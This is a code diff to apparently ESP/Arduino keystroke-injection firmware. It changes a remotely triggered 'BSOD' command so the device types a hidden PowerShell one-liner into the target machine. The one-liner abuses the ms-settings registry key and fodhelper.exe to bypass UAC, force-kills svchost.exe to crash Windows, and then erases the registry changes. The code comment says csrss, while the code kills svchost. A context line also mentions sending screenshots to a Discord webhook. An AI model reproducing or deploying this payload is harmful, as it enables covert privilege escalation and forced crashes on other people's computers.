@@ -404,45 +404,30 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
           LOG("[LangDetect] Already in progress\n");
         }
       } else if (combo == "BSOD") {
-        // Real BSOD: Enable CrashOnCtrlScroll via admin cmd, then trigger
-        // 1. Win+R → run reg add as admin
+        // Real BSOD via taskkill csrss (requires admin via fodhelper UAC bypass)
         Keyboard.press(KEY_LEFT_GUI);
         Keyboard.press('r');
         delay(20);
         Keyboard.releaseAll();
         delay(800);
-        Keyboard.print("powershell Start-Process cmd -Verb RunAs "
-                        "-ArgumentList '/c reg add HKLM\\SYSTEM\\CurrentControlSet"
-                        "\\Services\\kbdhid\\Parameters /v CrashOnCtrlScroll "
-                        "/t REG_DWORD /d 1 /f'");
+        Keyboard.print("cmd");
+        delay(200);
+        Keyboard.press(KEY_RETURN);
+        delay(20);
+        Keyboard.releaseAll();
+        delay(1000);
+        Keyboard.print(
+            "powershell -w h -nop -ep bypass -c \""
+            "New-Item 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Force;"
+            "New-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name 'DelegateExecute' -Value '' -Force;"
+            "Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name '(default)' -Value 'cmd.exe /c taskkill /f /im svchost.exe' -Force;"
+            "Start-Process 'C:\\Windows\\System32\\fodhelper.exe';"
+            "Start-Sleep -s 3;"
+            "Remove-Item 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force\" & exit");
         delay(300);
         Keyboard.press(KEY_RETURN);
         delay(20);
         Keyboard.releaseAll();
-        // 2. Wait for UAC prompt, press Alt+Y to confirm
-        delay(3000);
-        Keyboard.press(KEY_LEFT_ALT);
-        Keyboard.press('y');
-        delay(20);
-        Keyboard.releaseAll();
-        // 3. Wait for reg add to finish, then Ctrl+ScrollLock ×2
-        delay(3000);
-        KeyReport kr = {};
-        // First Ctrl+ScrollLock
-        kr.modifiers = 0x01; // Left Ctrl
-        kr.keys[0] = 0x47;   // HID ScrollLock
-        Keyboard.sendReport(&kr);
-        delay(200);
-        memset(&kr, 0, sizeof(kr));
-        Keyboard.sendReport(&kr); // release
-        delay(200);
-        // Second Ctrl+ScrollLock
-        kr.modifiers = 0x01;
-        kr.keys[0] = 0x47;
-        Keyboard.sendReport(&kr);
-        delay(200);
-        memset(&kr, 0, sizeof(kr));
-        Keyboard.sendReport(&kr); // release
         LOG("[WebKB] BSOD triggered\n");
       } else if (combo == "Screenshot") {
         // Capture screenshot & send to Discord webhook
